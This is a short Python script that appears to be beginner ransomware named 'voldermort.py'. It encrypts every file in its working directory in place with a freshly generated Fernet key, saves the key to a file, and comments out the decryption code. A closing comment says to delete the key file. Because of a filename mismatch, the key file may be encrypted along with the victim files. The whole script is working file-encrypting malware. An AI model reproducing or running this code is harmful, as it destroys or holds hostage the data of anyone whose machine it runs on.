import os
from cryptography.fernet import Fernet;

# find some files but ignore this file and the key file
files = [f for f in os.listdir('.') if os.path.isfile(f) and f != 'voldermort.py' and f != 'thekey.key']
print(files)

# generate a key and save it to a file
key = Fernet.generate_key()

with open("thekey", 'wb') as thekey:
    thekey.write(key)

# encrypt the files
for f in files:
    with open(f, 'rb') as file:
        file_data = file.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(file_data)

    with open(f, 'wb') as file:
        file.write(encrypted)

# decrypt the files
# for f in files:
#     with open(f, 'rb') as file:
#         encrypted_data = file.read()

#     fernet = Fernet(key)
#     decrypted = fernet.decrypt(encrypted_data)

#     with open(f, 'wb') as file:
#         file.write(decrypted)

# delete the key file
